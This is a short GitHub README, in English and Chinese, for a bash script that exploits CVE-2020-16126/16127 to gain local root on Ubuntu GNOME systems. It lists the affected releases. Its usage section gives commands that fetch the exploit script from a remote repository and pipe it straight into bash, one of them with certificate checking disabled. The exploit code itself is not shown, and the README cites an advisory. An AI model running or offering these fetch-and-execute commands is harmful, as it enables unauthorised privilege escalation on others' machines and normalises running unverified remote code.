# Ubuntu-Gnome-privilege-escalation
A bash script exploit of [CVE-2020-16126/CVE-2020-16127] to achieve privilege escalation.

一个可以方便实现Ubuntu本地提权的bash脚本（利用CVE-2020-16126/CVE-2020-16127漏洞），要求处于Gnome环境。

## Affect version
Ubuntu 20.04.1\20.10\18.04\16.04 LTS and so on

## Usage
`curl https://raw.githubusercontent.com/zev3n/Ubuntu-Gnome-privilege-escalation/main/CVE-2020-1612%5B6_7%5D_exploit.sh | bash`

or (If you have No permissions to install 'curl',you could try...)

`wget -q -O - --no-check-certificate https://raw.githubusercontent.com/zev3n/Ubuntu-Gnome-privilege-escalation/main/CVE-2020-1612%5B6_7%5D_exploit.sh | bash`

## Demonstration
TODO

## Reference
https://securitylab.github.com/advisories/GHSL-2020-187-accountsservice-drop-privs-DOS
